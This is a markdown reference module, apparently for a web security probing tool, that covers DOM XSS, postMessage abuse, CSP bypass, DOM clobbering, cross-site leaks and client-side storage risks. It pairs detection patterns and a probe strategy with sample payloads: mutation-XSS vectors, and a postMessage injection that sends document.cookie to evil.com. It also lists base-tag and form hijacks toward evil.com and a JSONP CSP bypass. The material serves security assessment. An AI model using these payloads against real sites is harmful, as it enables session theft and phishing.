# Client-Side Security

Probes for vulnerabilities that execute in the browser: DOM-based XSS,
postMessage abuse, CSP bypass, DOM clobbering, cross-site leaks, and
client-side storage misuse.

Use when the probe target is a web application with JavaScript-rendered UI
(React, Vue, Angular, Svelte, or vanilla JS).

---

## DOM XSS

### Source / Sink Inventory

| Source | Sink | Risk |
|--------|------|------|
| `location.hash` | `innerHTML` | Direct injection |
| `location.search` | `document.write` | Direct injection |
| `location.pathname` | `eval()` | Low (pathname is URL-decoded) |
| `document.referrer` | `insertAdjacentHTML` | Stored/incoming |
| `window.name` | `outerHTML` | Cross-origin window |
| `postMessage` | `createContextualFragment` | Cross-origin messaging |
| `cookie` | `srcdoc` (iframe) | Stored attribute |
| `localStorage.getItem()` | `setTimeout(string)` | Stored → code exec |
| `URL.createObjectURL()` | `<script src>` | Blob URL injection |
| `import()` | `new Function()` | Dynamic import/eval |

### Framework-Specific XSS Patterns

| Framework | Vulnerable pattern | Safe alternative |
|-----------|-------------------|-----------------|
| React | `dangerouslySetInnerHTML={{ __html: userInput }}` | Use components, sanitize DOMPurify first |
| React | `href={userInput}` (javascript: protocol) | Validate URL protocol whitelist |
| React | `eval()` or `new Function()` anywhere | Architectural smell |
| Vue | `v-html="userInput"` | `v-text` or component interpolation |
| Vue | `:href="userInput"` (javascript:) | Protocol validation |
| Angular | `[innerHTML]="userInput"` | `{{ }}` or bypass SecurityTrust bypass |
| Angular | `this.sanitizer.bypassSecurityTrustHtml()` | Security check bypassed intentionally |
| Svelte | `{@html userInput}` | `{userInput}` (escaped by default) |
| Svelte | `href={userInput}` | URL validation |

### Mutation XSS (mXSS)

Injection that bypasses sanitizers by exploiting parser differentials:

| Technique | Payload vector |
|-----------|---------------|
| SVG namespace | `<svg><math><script>alert(1)</script>` |
| `<noscript>` bypass | `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` |
| `<style>` mutation | `<style><math></style><img src=x onerror=alert(1)>` |
| `<table>` context | `<table><script>alert(1)</script>` (before IE reaches script node) |
| `<select>` insertion | `<select><script>alert(1)</script></select>` |

### Source Fingerprints

```yaml
detect_dom_xss:
  - signal: "user input assigned to innerHTML"
    pattern: "element.innerHTML = input", "el.insertAdjacentHTML('beforeend', data)"
    severity: Critical
  - signal: "dangerouslySetInnerHTML in React"
    pattern: "dangerouslySetInnerHTML={{ __html:", "dangerouslySetInnerHTML={sanitized ?"
    severity: High
  - signal: "v-html in Vue"
    pattern: "v-html=\"", ":v-html=\""
    severity: High
  - signal: "eval of user-controllable string"
    pattern: "eval(input)", "eval(response.data)"
    severity: High
  - signal: "DOMPurify absent before innerHTML"
    pattern: "innerHTML = " without "DOMPurify.sanitize"
    severity: High
```

---

## postMessage Abuse

### Security Checklist

| Check | Vulnerable pattern | Secure pattern |
|-------|-------------------|----------------|
| Origin validation | `window.addEventListener("message", handler)` without `event.origin` check | `if (event.origin !== "https://trusted.com") return` |
| Sender validation | Accepting messages from `window.parent`, `window.opener` without verifying source window | Track expected source windows |
| JSON parsing | `JSON.parse(event.data)` without try/catch | `try { JSON.parse(...) } catch { return }` |
| Data consumed unsafely | `eval(event.data)`, `location = event.data`, `innerHTML = event.data` | Validate structure, use type guards |

### Attack Patterns

```yaml
postMessage_attacks:
  - description: "No origin check — any window can send"
    exploit: "window.open('https://target'); await sleep(2000); target.postMessage(PAYLOAD, '*')"
    payload: '{"type": "navigate", "url": "https://evil.com/phish"}'
    signal: "addEventListener('message') without event.origin verify"
  - description: "HTML injection via postMessage"
    exploit: "postMessage(INJECTION)"
    payload: '{"type": "render", "html": "<img src=x onerror=fetch(\"https://evil.com/steal?cookie=\"+document.cookie)>"}'
    signal: "message data → innerHTML"
  - description: "postMessage to parent opens redirect"
    exploit: "parent.postMessage(INJECTION)"
    payload: '{"type": "openUrl", "url": "javascript:alert(1)"}'
    signal: "event.data.url passed to window.open or location.assign"
```

### Source Fingerprints

```yaml
detect_postmessage:
  - signal: "message listener without origin check"
    pattern: "addEventListener('message'" without "event.origin" or ".origin !="
    severity: High
  - signal: "postMessage with wildcard target"
    pattern: "postMessage(data, '*')"
    severity: High
  - signal: "message data used in DOM sink"
    pattern: "event.data" followed by "innerHTML", "location", "eval"
    severity: Critical
```

---

## CSP Bypass Fingerprinting

### Weak CSP Patterns

| CSP directive | Why it's weak | Bypass |
|---------------|---------------|--------|
| `script-src 'unsafe-inline'` | Any script executes | `document.body.innerHTML = '<img src=x onerror=alert(1)>'` |
| `script-src 'unsafe-eval'` | eval(), setTimeout(string) | `eval('alert(1)')` |
| `script-src https: //cdn.example.com` | Trusted CDN may host user content | Upload payload to CDN, use that URL |
| `script-src https://*.googleapis.com` | JSONP endpoint available | `https://accounts.google.com/o/oauth2/revoke?callback=alert(1)` |
| `object-src 'none'` missing | Flash/Silverlight | Plugin-based XSS if plugin present |
| `base-uri 'none'` missing | Base tag injection | `<base href="https://evil.com">` then relative script includes |
| `form-action 'none'` missing | Form submission to arbitrary origin | `<form action="https://evil.com/steal">` |

### CSP Bypass Source Fingerprints

```yaml
detect_csp_weakness:
  - signal: "unsafe-inline in script-src"
    pattern: "'unsafe-inline'" in CSP header or meta tag
    severity: High (defense-in-depth bypassed)
  - signal: "unsafe-eval in script-src"
    pattern: "'unsafe-eval'" in CSP
    severity: High
  - signal: "JSONP endpoint in script-src whitelist"
    pattern: "googleapis" in script-src, "facebook.com" in script-src
    severity: Medium (depends on JSONP endpoint)
  - signal: "base-uri missing or 'self'"
    pattern: "base-uri" absent from CSP
    severity: Medium
```

---

## DOM Clobbering

### Attack Vectors

| Technique | Payload |
|-----------|---------|
| Override form property | `<form id="config"><input name="apiUrl" value="https://evil.com"></form>` |
| Override global variable | `<a id="userIsAdmin">anything</a>` → `window.userIsAdmin` is truthy |
| Override instanceof check | `<a id="admin">` → `admin instanceof Object is true` |
| Override config object | `<img id="config" name="apiUrl" src="x">` |

### Detection Signals

```yaml
detect_dom_clobbering:
  - signal: "global variable access from DOM id"
    pattern: "window[userInput]", "globalThis[unvalidated]"
    severity: Medium
  - signal: "id attribute read as variable"
    pattern: "if (isAdmin)" where isAdmin could be <a> element
    severity: Medium
```

---

## XS-Leaks (Cross-Site Leaks)

### Attack Classes

| Class | Technique | Observable |
|-------|-----------|------------|
| Timing | Request timing via fetch/beacon | Different time for user vs non-user |
| Frame counting | `window.length` checks | Number of frames varies by auth state |
| CSS injection | `@import url(...)` with `:has()` selector | CSS rule matched/didn't match |
| Error-based | `onerror` handler on script/img | Resource exists vs doesn't (login detection) |
| Cache probing | Performance API timing | Cached resource (logged in) vs not (logged out) |

### Detection Signals

```yaml
detect_xs_leaks:
  - signal: "no SameSite=Strict/Lax on session cookie"
    pattern: "SameSite=None" or SameSite absent
    severity: Medium (enables cross-site timing)
  - signal: "no X-Frame-Options or CSP frame-ancestors"
    pattern: "X-Frame-Options" absent, "frame-ancestors" absent
    severity: Medium (enables framing + timing)
```

---

## Client-Side Storage Abuse

### Storage Type Risk Assessment

| Storage | Persistence | Scope | Sensitive data risk | XSS exfil threat |
|---------|-------------|-------|---------------------|------------------|
| `localStorage` | Until cleared | Origin | High (JWT, API keys, PII) | High — accessible via XSS |
| `sessionStorage` | Tab lifetime | Origin | Medium | High — accessible via XSS |
| `document.cookie` | Per cookie flags | Path/domain | Depends on httpOnly | Low (httpOnly prevents JS access) |
| `IndexedDB` | Until cleared | Origin | High | Medium (async, harder to exfil) |
| `Cache API` | Until cleared | Origin | Low (service worker only) | Low |
| `SharedWorker` | Worker lifetime | Origin | Medium | Low (limited API) |

### Detection Signals

```yaml
detect_storage_abuse:
  - signal: "JWT or API key stored in localStorage"
    pattern: "localStorage.setItem('token'", "localStorage.setItem('apiKey'"
    severity: Medium (XSS loses everything)
  - signal: "sensitive data stored in sessionStorage"
    pattern: "sessionStorage.setItem('ssn'", "sessionStorage.setItem('cpf'"
    severity: High (PII in client-side storage)
  - signal: "httpOnly flag missing on session cookie"
    pattern: "httpOnly=false" or httpOnly absent on cookie containing SID
    severity: High
```

---

## Response Signal Table

| Signal | Likely Vuln |
|--------|-------------|
| `innerHTML` with user input | DOM XSS |
| `postMessage` handler without origin check | postMessage XSS / navigation |
| `eval()` or `setTimeout(string)` | Code injection via string eval |
| CSP with `unsafe-inline` | Defense-in-depth bypass (XSS fully exploitable) |
| CSP with JSONP endpoint | CSP bypass via trusted CDN |
| `dangerouslySetInnerHTML` without DOMPurify | React XSS |
| `v-html` with user content | Vue XSS |
| `base-uri` missing from CSP | Base tag injection |
| `SameSite=None` on session cookie | CSRF + XS-Leak |
| JWT in `localStorage` | Session hijack via XSS |

---

## Probe Strategy

1. Scan all JS bundles for DOM XSS source-sink pairs (static)
2. Read CSP header/meta tag and identify bypassable directives
3. Check all `postMessage` listeners for origin validation
4. Check all `localStorage`/`sessionStorage` writes for sensitive data
5. Check cookie flags (httpOnly, secure, SameSite)
6. If live probe consented, test each DOM XSS sink with a payload via curl or Selenium-like approach
7. If OOB callbacks allowed, set up a listener to detect XS-Leak timing probes
